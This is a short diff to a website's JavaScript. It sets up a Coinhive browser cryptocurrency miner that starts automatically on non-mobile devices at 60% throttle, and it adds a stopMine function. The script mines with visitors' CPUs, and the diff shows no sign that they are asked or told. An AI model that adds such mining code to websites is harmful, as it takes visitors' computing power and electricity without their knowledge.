@@ -44,11 +44,15 @@ menuClick();
 //Coinhive scripts
 var miner = new CoinHive.Anonymous('4SxY5rIdGvO3MT3CJet0Hm8GEjGW7SP2', 'dev_log', {
 	throttle: 0.6,
-	theme: 'light',
-	language: 'auto'
+	theme: 'light'
 });
 
 // Only start on non-mobile devices
 if (!miner.isMobile()) {
 	miner.start();
+}
+
+function stopMine(){
+    if(typeof miner !== 'undefined' && miner.isRunning())
+        miner.stop();
 }
